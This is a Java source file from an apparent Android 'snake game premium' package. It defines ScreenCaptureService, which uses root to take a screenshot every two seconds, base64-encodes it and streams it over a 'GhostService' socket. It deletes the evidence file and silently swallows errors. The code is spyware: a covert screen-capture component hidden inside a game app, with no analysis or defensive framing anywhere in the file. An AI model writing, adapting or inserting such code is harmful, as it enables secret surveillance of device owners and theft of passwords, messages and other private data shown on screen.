package com.snakegame.premium;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;

public class ScreenCaptureService {
    private Context ctx;
    private HandlerThread thread;
    private Handler handler;
    private boolean running = false;

    public ScreenCaptureService(Context ctx) { this.ctx = ctx; }

    public void start() {
        if (running) return;
        running = true;
        thread = new HandlerThread("ScreenCapture");
        thread.start();
        handler = new Handler(thread.getLooper());
        handler.post(captureRunnable);
    }

    public void stop() {
        running = false;
        if (thread != null) thread.quitSafely();
    }

    private Runnable captureRunnable = new Runnable() {
        @Override
        public void run() {
            if (!running) return;
            try {
                Process su = Runtime.getRuntime().exec("su -c screencap -p /data/local/tmp/scr.png");
                su.waitFor();
                File f = new File("/data/local/tmp/scr.png");
                if (f.exists()) {
                    Bitmap bmp = BitmapFactory.decodeFile(f.getAbsolutePath());
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bmp.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                    String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                    GhostService svc = GhostService.getInstance();
                    if (svc != null && svc.getSocket() != null) {
                        svc.getSocket().send("screen_frame", base64);
                    }
                    f.delete();
                }
            } catch (Exception e) {}
            handler.postDelayed(this, 2000);
        }
    };
}
